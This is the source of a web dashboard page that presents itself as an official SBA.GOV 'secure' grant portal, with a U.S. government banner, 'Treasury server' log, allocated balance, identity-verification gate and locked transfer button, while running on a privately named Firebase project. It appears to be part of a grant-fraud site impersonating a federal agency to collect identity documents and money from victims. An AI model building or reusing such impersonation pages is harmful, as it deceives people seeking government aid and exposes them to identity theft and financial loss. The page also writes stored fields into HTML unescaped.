<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBA Portal | Secure Dashboard</title>
    <link rel="stylesheet" href="style.css">
    <style>
        :root { --sba-blue: #00274c; --sba-red: #ba0c2f; --accent: #2563eb; }
        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
        
        /* Fixed Alert Bar */
        #updateAlert {
            display: none;
            background: var(--sba-red);
            color: white;
            text-align: center;
            padding: 12px;
            font-size: 11px;
            font-weight: 800;
            position: fixed;
            top: 0; left: 0; width: 100%;
            z-index: 10000;
            text-transform: uppercase;
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
        }

        /* Nav & Banner Fix */
        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 5px 15px; display: flex; align-items: center; font-weight: bold; }
        .nav-header { background: var(--sba-blue); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
        .nav-logo { color: white; margin: 0; font-size: 18px; letter-spacing: 2px; font-weight: 900; }
        
        .logout-btn { 
            background: transparent; 
            border: 1px solid rgba(255,255,255,0.4); 
            color: white; 
            padding: 6px 15px; 
            border-radius: 4px; 
            font-size: 10px; 
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        .logout-btn:hover { background: var(--sba-red); border-color: var(--sba-red); }

        /* Balance Card */
        .balance-section {
            background: linear-gradient(135deg, var(--sba-blue) 0%, #004a91 100%);
            margin: 20px;
            padding: 30px 25px;
            border-radius: 15px;
            color: white;
            box-shadow: 0 10px 25px rgba(0,39,76,0.2);
            position: relative;
            overflow: hidden;
        }
        .balance-section::after {
            content: ""; position: absolute; top: -50px; right: -50px; 
            width: 150px; height: 150px; background: rgba(255,255,255,0.05); border-radius: 50%;
        }

        .status-pill {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 50px;
            font-size: 9px;
            font-weight: 900;
            text-transform: uppercase;
            margin-top: 15px;
            letter-spacing: 0.5px;
        }
        .status-pending { background: #f59e0b; color: #fff; }
        .status-verified { background: #10b981; color: #fff; }
        .status-declined { background: #ef4444; color: #fff; }

        /* Action Grid */
        .grid-container { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; padding: 0 20px; }
        .grid-item {
            background: white;
            padding: 20px 10px;
            border-radius: 12px;
            text-align: center;
            border: 1px solid #e2e8f0;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .grid-item:active { transform: scale(0.95); }
        .grid-item span { display: block; font-size: 22px; margin-bottom: 8px; }
        .grid-item b { font-size: 10px; color: var(--sba-blue); text-transform: uppercase; }

        /* Lock logic */
        .is-locked { opacity: 0.4; cursor: not-allowed !important; filter: grayscale(1); }

        /* Activity Log */
        .activity-card {
            background: white;
            margin: 25px 20px;
            padding: 20px;
            border-radius: 12px;
            border: 1px solid #e2e8f0;
        }
        .log-title { font-size: 11px; font-weight: 900; color: var(--sba-blue); text-transform: uppercase; border-bottom: 1px solid #f1f5f9; padding-bottom: 10px; margin-bottom: 15px; display: flex; justify-content: space-between; }
        
        .log-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #f8fafc; }
        .log-item:last-child { border-bottom: none; }
    </style>
</head>
<body>

    <div id="updateAlert">OFFICIAL NOTICE: ACCOUNT FILE STATUS UPDATED</div>

    <div class="gov-banner">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE 2026
    </div>

    <div class="nav-header">
        <h1 class="nav-logo">SBA.GOV</h1>
        <button class="logout-btn" id="logoutBtn">SIGN OUT</button>
    </div>

    <div class="balance-section">
        <p style="margin:0; font-size:10px; text-transform:uppercase; letter-spacing:1px; opacity:0.8;">Total Allocated Balance</p>
        <h1 id="userBalance" style="font-size:40px; margin:10px 0; font-weight: 800; letter-spacing:-1px;">$0.00</h1>
        <div id="statusPill" class="status-pill status-pending">Authenticating...</div>
    </div>

    <div class="grid-container">
        <div class="grid-item" id="applyLink"><span>üìù</span><b>Apply</b></div>
        <div class="grid-item" id="transferLink"><span>üè¶</span><b>Transfer</b></div>
        <div class="grid-item" onclick="location.href='transactions.html'"><span>üìä</span><b>Ledger</b></div>
        <div class="grid-item" onclick="location.href='kyc.html'"><span>üõ°Ô∏è</span><b>Verify ID</b></div>
        <div class="grid-item" onclick="location.href='support.html'"><span>üí¨</span><b>Messages</b></div>
        <div class="grid-item" onclick="location.href='settings.html'"><span>‚öôÔ∏è</span><b>Settings</b></div>
    </div>

    <div class="activity-card">
        <div class="log-title">
            <span>Federal Activity Log</span>
            <span style="color:#94a3b8;">LIVE</span>
        </div>
        <div id="activityLog">
            <p style="text-align:center; font-size:11px; color:#94a3b8;">Connecting to Treasury server...</p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, onSnapshot, collection, query, where, orderBy } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
            authDomain: "sba-grant-2026.firebaseapp.com",
            projectId: "sba-grant-2026",
            storageBucket: "sba-grant-2026.firebasestorage.app",
            messagingSenderId: "838430821326",
            appId: "1:838430821326:web:6438deacb334076a64f99f"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        let firstLoad = true;
        let cachedStatus = "";

        onAuthStateChanged(auth, (user) => {
            if (!user) { window.location.href = 'index.html'; return; }

            // 1. REAL-TIME DATA LISTENER
            onSnapshot(doc(db, "users", user.uid), (snap) => {
                if (snap.exists()) {
                    const data = snap.data();
                    const status = (data.status || "PENDING").toUpperCase();
                    const balance = parseFloat(data.balance || 0);

                    // Update Balance & Status UI
                    document.getElementById('userBalance').innerText = "$" + balance.toLocaleString('en-US', {minimumFractionDigits: 2});
                    
                    const pill = document.getElementById('statusPill');
                    pill.innerText = "‚óè " + status;
                    
                    // Pill Color Logic
                    pill.className = "status-pill";
                    if(status.includes("VERIFIED") || status.includes("APPROVED")) pill.classList.add("status-verified");
                    else if(status.includes("DECLINED") || status.includes("REJECTED")) pill.classList.add("status-declined");
                    else pill.classList.add("status-pending");

                    // 2. PROGRESS LOCK LOGIC
                    const isVerified = status.includes("VERIFIED");
                    const applyBtn = document.getElementById('applyLink');
                    const transferBtn = document.getElementById('transferLink');

                    // Apply Logic
                    if(!isVerified) {
                        applyBtn.classList.add('is-locked');
                        applyBtn.onclick = () => alert("ACCESS DENIED: You must verify your identity (KYC) first.");
                    } else {
                        applyBtn.classList.remove('is-locked');
                        applyBtn.onclick = () => location.href = 'apply.html';
                    }

                    // Transfer Logic
                    if(!isVerified || balance <= 0) {
                        transferBtn.classList.add('is-locked');
                        transferBtn.onclick = () => alert("RESTRICTED: Insufficient allocated funds or Identity not verified.");
                    } else {
                        transferBtn.classList.remove('is-locked');
                        transferBtn.onclick = () => location.href = 'transfer.html';
                    }

                    // 3. UPDATE ALERT TRIGGER
                    if(!firstLoad && cachedStatus !== status) {
                        const bar = document.getElementById('updateAlert');
                        bar.style.display = 'block';
                        setTimeout(() => bar.style.display = 'none', 8000);
                    }
                    cachedStatus = status;
                    firstLoad = false;
                }
            });

            // 4. ACTIVITY LOG LISTENER
            const q = query(collection(db, "requests"), where("userId", "==", user.uid));
            onSnapshot(q, (snap) => {
                const logBox = document.getElementById('activityLog');
                if(snap.empty) {
                    logBox.innerHTML = '<p style="text-align:center; font-size:10px; color:#94a3b8;">NO RECENT ACTIVITY RECORDED</p>';
                    return;
                }
                logBox.innerHTML = "";
                snap.forEach(d => {
                    const r = d.data();
                    logBox.innerHTML += `
                        <div class="log-item">
                            <div>
                                <b style="font-size:11px; color:#1e293b;">${r.type}</b><br>
                                <small style="color:#94a3b8; font-size:9px;">FILE: ${d.id.substring(0,8).toUpperCase()}</small>
                            </div>
                            <div style="text-align:right;">
                                <b style="color:var(--sba-blue); font-size:12px;">${r.amount ? '$'+parseFloat(r.amount).toLocaleString() : 'DOCS'}</b><br>
                                <small style="color:#f59e0b; font-weight:bold; font-size:9px;">${(r.status || 'PENDING').toUpperCase()}</small>
                            </div>
                        </div>`;
                });
            });
        });

        // 5. SIGN OUT
        document.getElementById('logoutBtn').onclick = () => {
            if(confirm("Securely sign out of the SBA Portal?")) {
                signOut(auth).then(() => window.location.href = 'index.html');
            }
        };
    </script>
</body>
</html>
